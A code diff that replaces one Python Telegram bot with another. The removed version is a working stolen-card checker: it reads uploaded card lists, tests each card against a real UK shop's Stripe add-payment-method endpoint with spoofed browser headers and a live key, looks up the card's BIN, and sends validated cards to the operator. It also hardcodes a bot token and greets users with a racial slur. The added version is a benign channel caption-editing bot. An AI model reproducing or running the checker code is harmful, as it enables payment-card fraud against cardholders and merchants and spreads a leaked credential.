@@ -1,186 +1,350 @@
-import requests
-import random
-import string
-import re
-import sys
-from bs4 import BeautifulSoup
-import user_agent
+import json
+import logging
 import os
-import telebot
+from pathlib import Path
 
-TOKEN = "8134725362:AAF44hc8HcxdcZlDYfP7luvaO7T_aNnM-1U"
-ID = "7613434345"
-print("/start Your Bot")
-bot = telebot.TeleBot(TOKEN)
-admin = ID
-ua = user_agent.generate_user_agent()
+from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
+from telegram.constants import ParseMode, ChatType
+from telegram.ext import Application, ContextTypes, MessageHandler, CommandHandler, filters
 
-def nonce_id():
-    headers = {'user-agent': ua}
-    response = requests.get('https://www.amsons.co.uk/my-account/add-payment-method/', headers=headers)
-    match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-fA-F0-9]+)"', response.text)
-    return match.group(1) if match else None
+BOT_TOKEN = os.getenv("BOT_TOKEN") or "PUT_BOT_TOKEN_HERE"
+OWNER_ID = int(os.getenv("OWNER_ID") or "0")
 
-def get_id(cc, mm, yy, cvv):
-    headers = {
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'no-cache',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'pragma': 'no-cache',
-        'priority': 'u=1, i',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': ua,
-    }
-    data = {
-        'type': 'card',
-        'card[number]': cc,
-        'card[cvc]': cvv,
-        'card[exp_year]': yy,
-        'card[exp_month]': mm,
-        'allow_redisplay': 'unspecified',
-        'billing_details[address][country]': 'IN',
-        'payment_user_agent': 'stripe.js/5ea0d5a7b4; stripe-js-v3/5ea0d5a7b4; payment-element; deferred-intent',
-        'referrer': 'https://www.amsons.co.uk',
-        'time_on_page': str(random.randint(10000, 60000)),
-        'client_attribution_metadata[client_session_id]': '3ec07baa-adab-4334-a3dd-f9c09184fe29',
-        'client_attribution_metadata[merchant_integration_source]': 'elements',
-        'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
-        'client_attribution_metadata[merchant_integration_version]': '2021',
-        'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
-        'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
-        'guid': 'c13855f7-15a5-4028-8920-f51341b4c44d42ae05',
-        'muid': '8d408980-d5dc-4ae0-ac80-c86dc0dddc4513472d',
-        'sid': '88ef3efa-d1b7-46ed-9129-d0d23bd4bc5a0ed2e9',
-        'key': 'pk_live_51HOiwNEd5KxWjPnfRdU08zhvpQx2jzI9MfK2IEJionX9xVdhFCLBZ9BAlpGVRzrFkukUvM6sBFEDVvOx6CfY0pDQ00hRNkYg2T',
-        '_stripe_version': '2024-06-20',
-    }
-    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
-    return response.json()['id'] if response.status_code == 200 else None
+CUSTOM_TEXT = """🔥 Join Our Premium Channel
+📢 Latest Updates Daily
 
-def final(iddd, nonce):
-    headers = {
-        'accept': '*/*',
-        'accept-language': 'en-US,en;q=0.9',
-        'cache-control': 'no-cache',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://www.amsons.co.uk',
-        'pragma': 'no-cache',
-        'priority': 'u=1, i',
-        'referer': 'https://www.amsons.co.uk/my-account/add-payment-method/',
-        'sec-ch-ua': '"Chromium";v="131", "Not_A Brand";v="24", "Microsoft Edge Simulate";v="131", "Lemur";v="131"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': ua,
-        'x-requested-with': 'XMLHttpRequest',
-    }
-    params = {'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent'}
-    data = {
-        'action': 'create_and_confirm_setup_intent',
-        'wc-stripe-payment-method': iddd,
-        'wc-stripe-payment-type': 'card',
-        '_ajax_nonce': nonce,
-    }
-    response = requests.post('https://www.amsons.co.uk/', params=params, headers=headers, data=data)
-    return response.text
-    
-def bin_dt(bin):
+Post No: {count}
+
+👉 https://t.me/mixbadis9
+"""
+
+CONFIG_FILE = Path("channels.json")
+
+
+# ---------------- CONFIG ---------------- #
+
+def load_config():
+    try:
+        if CONFIG_FILE.exists():
+            return json.loads(CONFIG_FILE.read_text())
+    except:
+        pass
+
+    return {"channels": {}}
+
+
+def save_config(cfg):
+    CONFIG_FILE.write_text(json.dumps(cfg, indent=2))
+
+
+# ---------------- UTIL ---------------- #
+
+def is_media(msg):
+    return any([
+        msg.photo,
+        msg.video,
+        msg.document,
+        msg.animation
+    ])
+
+
+def is_owner(update):
+    if OWNER_ID == 0:
+        return True
+
+    user = update.effective_user
+    return user and user.id == OWNER_ID
+
+
+# ---------------- CHANNEL POST HANDLER ---------------- #
+
+async def handle_channel_post(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    try:
+
+        msg = update.effective_message
+        chat = update.effective_chat
+
+        if chat.type != ChatType.CHANNEL:
+            return
+
+        if not is_media(msg):
+            return
+
+        cfg = load_config()
+        channels = cfg["channels"]
+
+        ch = channels.get(str(chat.id))
+
+        if not ch:
+            return
+
+        count = ch.get("count", 0) + 1
+        ch["count"] = count
+
+        caption_template = ch.get("caption", CUSTOM_TEXT)
+
+        caption = caption_template.format(count=count)
+
+        keyboard = None
+
+        if ch.get("button"):
+
+            text = ch.get("button_text")
+            url = ch.get("button_url")
+
+            keyboard = InlineKeyboardMarkup(
+                [[InlineKeyboardButton(text, url=url)]]
+            )
+
+        save_config(cfg)
+
         try:
-            api_url = requests.get("https://bins.antipublic.cc/bins/" + str(bin), timeout=30).json()
-            return api_url
-        except:
-            return None
 
-def return_info(api):
-        if not api or 'Invalid BIN' in api or 'detail' in api:
-            return "BIN Lookup Failed"
-        brand = api.get("brand", "Unknown")
-        card_type = api.get("type", "Unknown")
-        level = api.get("level", "Unknown")
-        bank = api.get("bank", "Unknown")
-        country_name = api.get("country_name", "Unknown")
-        country_flag = api.get("country_flag", "")
-        bin = api.get('bin', "Unknown")
-        look = f"""
-    𝗕𝗶𝗻 : {bin}
-    𝗜𝗻𝗳𝗼 : {brand}-{card_type}-{level}
-    𝗕𝗮𝗻𝗸 : {bank}
-    𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_name} {country_flag}
-    """
-        return look
+            await msg.edit_caption(
+                caption=caption,
+                parse_mode=ParseMode.HTML,
+                reply_markup=keyboard
+            )
 
-@bot.message_handler(commands=['start'])
-def start(message):
-        bot.reply_to(message, "Hello Nigga\nSend Me CC List(.txt)..!!", parse_mode="markdown")
+        except Exception as e:
 
-@bot.message_handler(content_types=['document'])
-def chk_compo(message):
-        finfo = bot.get_file(message.document.file_id)
-        downlod = bot.download_file(finfo.file_path)
-        path = os.path.join("files", message.document.file_name)
-        os.makedirs("files", exist_ok=True)
-        with open(path, "wb") as compo:
-            compo.write(downlod)
+            logging.warning(f"Edit caption failed: {e}")
 
-        with open(path, encoding="utf-8") as file:
-            total_lines = sum(1 for line in file)
+    except Exception as e:
 
-        progress_message = bot.reply_to(message, 
-            f"Hold On <> Checking your combo..!!\nProgress : 0/{total_lines}", 
-            parse_mode="markdown")
+        logging.error(e)
 
-        checked_lines = 0
-        with open(path, encoding="utf-8") as file:
-            for line in file:
-                cc_line = line.strip()
-                checked_lines += 1
-                try:
-                    cc, mm, yy, cvv = cc_line.split('|')
-                    yy = '20' + yy if len(yy) == 2 else yy
-                except ValueError:
-                    print(f"Invalid format: {cc_line}")
-                    continue
 
-                bin_number = cc[:6]
-                look = bin_dt(bin_number)
-                iddd = get_id(cc, mm, yy, cvv)
-                if iddd:
-                    nonce = nonce_id()
-                    if nonce:
-                        response_text = final(iddd, nonce)
-                        if 'succeeded' in response_text:
-                            mess = f'''
-    𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
+# ---------------- COMMANDS ---------------- #
 
-    𝗖𝗮𝗿𝗱 : {cc_line}
-    𝗚𝗮𝘁𝗲𝘄𝗮𝘆 : Stripe Auth
-    𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : Card Added Successfully
-    {return_info(look)}
-    BY - @RussianPelo'''
-                            bot.send_message(admin, mess, parse_mode="markdown")
-                            print(f"✅ Approved : {cc_line} - @scrapperchannel_op")
-                        else:
-                            print(f"❌ Declined : {cc_line}")
-                    else:
-                        print(f"Nonce Error : {cc_line}")
-                else:
-                    print(f"Maybe Api Dead 🤡\nTry Again..!!")
+async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
-                bot.edit_message_text(
-                    chat_id=progress_message.chat.id,
-                    message_id=progress_message.message_id,
-                    text=f"Hold On <> Checking your combo..!!\nProgress : {checked_lines}/{total_lines}",
-                    parse_mode="markdown"
-                )
+    if not is_owner(update):
+        return
 
-bot.infinity_polling(timeout=25)
+    try:
+
+        args = context.args
+
+        if len(args) < 1:
+            await update.message.reply_text("Usage:\n/addchannel -100xxxx")
+            return
+
+        channel_id = args[0]
+
+        cfg = load_config()
+
+        cfg["channels"][channel_id] = {
+
+            "caption": CUSTOM_TEXT,
+            "count": 0,
+            "button": False,
+            "button_text": "",
+            "button_url": ""
+
+        }
+
+        save_config(cfg)
+
+        await update.message.reply_text(f"Channel added:\n{channel_id}")
+
+    except Exception as e:
+
+        await update.message.reply_text(str(e))
+
+
+async def remove_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not is_owner(update):
+        return
+
+    args = context.args
+
+    if len(args) < 1:
+        await update.message.reply_text("/removechannel channel_id")
+        return
+
+    cfg = load_config()
+
+    if args[0] in cfg["channels"]:
+        del cfg["channels"][args[0]]
+
+        save_config(cfg)
+
+        await update.message.reply_text("Channel removed")
+
+
+async def set_caption(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not is_owner(update):
+        return
+
+    if len(context.args) < 2:
+
+        await update.message.reply_text(
+            "/setcaption channel_id caption"
+        )
+        return
+
+    channel_id = context.args[0]
+
+    caption = " ".join(context.args[1:])
+
+    cfg = load_config()
+
+    if channel_id not in cfg["channels"]:
+        await update.message.reply_text("Channel not added")
+        return
+
+    cfg["channels"][channel_id]["caption"] = caption
+
+    save_config(cfg)
+
+    await update.message.reply_text("Caption updated")
+
+
+async def enable_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not is_owner(update):
+        return
+
+    if len(context.args) < 3:
+
+        await update.message.reply_text(
+            "/enablebutton channel_id text url"
+        )
+        return
+
+    channel_id = context.args[0]
+    text = context.args[1]
+    url = context.args[2]
+
+    cfg = load_config()
+
+    if channel_id not in cfg["channels"]:
+        await update.message.reply_text("Channel not added")
+        return
+
+    ch = cfg["channels"][channel_id]
+
+    ch["button"] = True
+    ch["button_text"] = text
+    ch["button_url"] = url
+
+    save_config(cfg)
+
+    await update.message.reply_text("Button enabled")
+
+
+async def disable_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not is_owner(update):
+        return
+
+    if len(context.args) < 1:
+        return
+
+    cfg = load_config()
+
+    ch = cfg["channels"].get(context.args[0])
+
+    if not ch:
+        return
+
+    ch["button"] = False
+
+    save_config(cfg)
+
+    await update.message.reply_text("Button disabled")
+
+
+async def set_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not is_owner(update):
+        return
+
+    if len(context.args) < 2:
+        return
+
+    channel_id = context.args[0]
+    num = int(context.args[1])
+
+    cfg = load_config()
+
+    if channel_id not in cfg["channels"]:
+        return
+
+    cfg["channels"][channel_id]["count"] = num
+
+    save_config(cfg)
+
+    await update.message.reply_text("Count updated")
+
+
+async def list_channels(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    if not is_owner(update):
+        return
+
+    cfg = load_config()
+
+    txt = ""
+
+    for cid, data in cfg["channels"].items():
+
+        txt += f"{cid} | Post:{data['count']}\n"
+
+    if not txt:
+        txt = "No channels"
+
+    await update.message.reply_text(txt)
+
+
+async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+
+    txt = """
+Commands:
+
+/addchannel -100xxxx
+
+/removechannel -100xxxx
+
+/setcaption -100xxxx Caption text {count}
+
+/enablebutton -100xxxx text url
+
+/disablebutton -100xxxx
+
+/setcount -100xxxx number
+
+/listchannels
+"""
+
+    await update.message.reply_text(txt)
+
+
+# ---------------- MAIN ---------------- #
+
+def main():
+
+    logging.basicConfig(level=logging.INFO)
+
+    app = Application.builder().token(BOT_TOKEN).build()
+
+    app.add_handler(MessageHandler(filters.ChatType.CHANNEL, handle_channel_post))
+
+    app.add_handler(CommandHandler("addchannel", add_channel))
+    app.add_handler(CommandHandler("removechannel", remove_channel))
+    app.add_handler(CommandHandler("setcaption", set_caption))
+    app.add_handler(CommandHandler("enablebutton", enable_button))
+    app.add_handler(CommandHandler("disablebutton", disable_button))
+    app.add_handler(CommandHandler("setcount", set_count))
+    app.add_handler(CommandHandler("listchannels", list_channels))
+    app.add_handler(CommandHandler("help", help_cmd))
+
+    app.run_polling()
+
+
+if __name__ == "__main__":
+    main()
